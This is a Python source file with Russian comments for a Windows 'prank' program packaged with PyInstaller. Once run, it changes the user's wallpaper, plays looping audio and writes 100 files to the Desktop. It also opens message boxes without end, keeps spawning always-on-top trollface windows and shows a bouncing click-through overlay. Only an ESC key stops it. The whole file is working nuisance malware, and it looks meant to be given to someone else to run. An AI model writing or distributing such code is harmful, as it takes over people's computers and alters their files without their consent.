import ctypes
import os
import random
import sys
import threading
import time
import tkinter as tk
from PIL import Image, ImageTk


# -------------------------------------------------------------------
# Функция для PyInstaller (ОБЯЗАТЕЛЬНО в начале)
# -------------------------------------------------------------------
def resource_path(relative_path):
    """
    Получает абсолютный путь к ресурсу.
    Работает как для обычного запуска Python, так и для PyInstaller (--onefile).
    """
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


# -------------------------------------------------------------------
# Определение путей к ресурсам
# -------------------------------------------------------------------
AUDIO_FILE = resource_path("audio.mp3")
TOM_IMG_FILE = resource_path("tom.png")
MASK_IMG_FILE = resource_path("trollface.jpg")


# -------------------------------------------------------------------
# 0. Аварийное выключение по клавише ESC
# -------------------------------------------------------------------
def listen_for_esc():
    while True:
        if ctypes.windll.user32.GetAsyncKeyState(0x1B) & 0x8000:
            os._exit(0)
        time.sleep(0.05)


# -------------------------------------------------------------------
# 1. Текст в стиле DVD Screensaver
# -------------------------------------------------------------------
def show_dvd_aura_text():
    time.sleep(10)

    aura_win = tk.Tk()
    aura_win.overrideredirect(True)
    aura_win.attributes("-topmost", True)
    aura_win.attributes("-transparentcolor", "black")
    aura_win.config(bg="black")

    screen_w = aura_win.winfo_screenwidth()
    screen_h = aura_win.winfo_screenheight()

    win_w, win_h = 600, 100

    label = tk.Label(
        aura_win,
        text="AURA +1000000000",
        font=("Arial", 45, "bold"),
        fg="red",
        bg="black",
    )
    label.pack(expand=True)

    hwnd = ctypes.windll.user32.GetParent(aura_win.winfo_id())
    style = ctypes.windll.user32.GetWindowLongW(hwnd, -20)
    ctypes.windll.user32.SetWindowLongW(hwnd, -20, style | 0x80000 | 0x20)

    def keep_on_top():
        try:
            aura_win.lift()
            aura_win.attributes("-topmost", True)
        except Exception:
            pass
        aura_win.after(10, keep_on_top)

    x = random.randint(0, max(1, screen_w - win_w))
    y = random.randint(0, max(1, screen_h - win_h))
    dx, dy = 5, 5

    def animate_dvd():
        nonlocal x, y, dx, dy
        x += dx
        y += dy

        if x <= 0 or x + win_w >= screen_w:
            dx = -dx
        if y <= 0 or y + win_h >= screen_h:
            dy = -dy

        aura_win.geometry(f"{win_w}x{win_h}+{x}+{y}")
        aura_win.after(20, animate_dvd)

    keep_on_top()
    animate_dvd()
    aura_win.mainloop()


# -------------------------------------------------------------------
# 2. Функция запуска фоновой музыки
# -------------------------------------------------------------------
def play_background_music(audio_path):
    if not os.path.exists(audio_path):
        return

    abs_path = os.path.abspath(audio_path)
    winmm = ctypes.windll.winmm

    winmm.mciSendStringW(
        f'open "{abs_path}" type mpegvideo alias bgm', None, 0, 0
    )
    winmm.mciSendStringW("play bgm repeat", None, 0, 0)


# -------------------------------------------------------------------
# 3. Функция смены обоев
# -------------------------------------------------------------------
def set_wallpaper(image_path):
    if not os.path.exists(image_path):
        return
    abs_path = os.path.abspath(image_path)
    ctypes.windll.user32.SystemParametersInfoW(20, 0, abs_path, 3)


# -------------------------------------------------------------------
# 4. Создание 100 файлов на Рабочем столе
# -------------------------------------------------------------------
def create_files():
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    for i in range(1, 101):
        filename = os.path.join(desktop, f"AURA_{i}.txt")
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write("AURA OVERFLOW")
        except Exception:
            pass
        time.sleep(0.01)


# -------------------------------------------------------------------
# 5. БЕСКОНЕЧНЫЙ спавн диалоговых окон
# -------------------------------------------------------------------
def spawn_infinite_messages():
    messages = [
        ("Aura", "Mundo vai girar..."),
        ("Aura", "E ela vai voltar..."),
        ("Aura", "Lembra daquela garota?"),
        ("Aura", "Agora ela quer me dar..."),
        ("Aura", "Hoje a vida mudou..."),
        ("Aura", "E hoje eu nao quero mais pegar voce..."),
        ("Aura", "Sabe por que? Porque sua..."),
    ]

    while True:
        for title, text in messages:
            threading.Thread(
                target=ctypes.windll.user32.MessageBoxW,
                args=(0, text, title, 0x40 | 0x0),
                daemon=False,
            ).start()
            time.sleep(1.5)


# -------------------------------------------------------------------
# 6. Бесконечный спавнер масок на Tkinter
# -------------------------------------------------------------------
class MaskSpawner:

    def __init__(self, image_path):
        self.image_path = image_path
        self.root = tk.Tk()
        self.root.withdraw()

        self.screen_w = self.root.winfo_screenwidth()
        self.screen_h = self.root.winfo_screenheight()

        self.pil_img = Image.open(image_path).convert("RGBA")

        self.spawn_next_mask()
        self.root.mainloop()

    def spawn_next_mask(self):
        try:
            top = tk.Toplevel(self.root)
            top.overrideredirect(True)
            top.attributes("-topmost", True)
            top.attributes("-transparentcolor", "black")

            size = random.randint(100, 250)
            img_resized = self.pil_img.resize((size, size))
            photo = ImageTk.PhotoImage(img_resized)

            label = tk.Label(top, image=photo, bg="black", bd=0)
            label.image = photo
            label.pack()

            top.bind("<Button-1>", lambda e: top.destroy())

            x = random.randint(0, max(0, self.screen_w - size))
            y = random.randint(0, max(0, self.screen_h - size))
            top.geometry(f"{size}x{size}+{x}+{y}")

        except Exception:
            pass

        self.root.after(50, self.spawn_next_mask)


# -------------------------------------------------------------------
# 7. Главный сценарий
# -------------------------------------------------------------------
if __name__ == "__main__":
    # 0. Отслеживание клавиши ESC
    threading.Thread(target=listen_for_esc, daemon=True).start()

    # 1. Запуск летающего текста DVD AURA через 10 секунд
    threading.Thread(target=show_dvd_aura_text, daemon=True).start()

    # 2. Запуск фоновой музыки
    threading.Thread(
        target=play_background_music, args=(AUDIO_FILE,), daemon=True
    ).start()

    # 3. Смена обоев
    set_wallpaper(TOM_IMG_FILE)

    # 4. Создание 100 файлов на Рабочем столе
    threading.Thread(target=create_files, daemon=True).start()

    # 5. Бесконечный спавн диалоговых окон
    threading.Thread(target=spawn_infinite_messages, daemon=True).start()

    # 6. Бесконечный спавн масок
    if os.path.exists(MASK_IMG_FILE):
        MaskSpawner(MASK_IMG_FILE)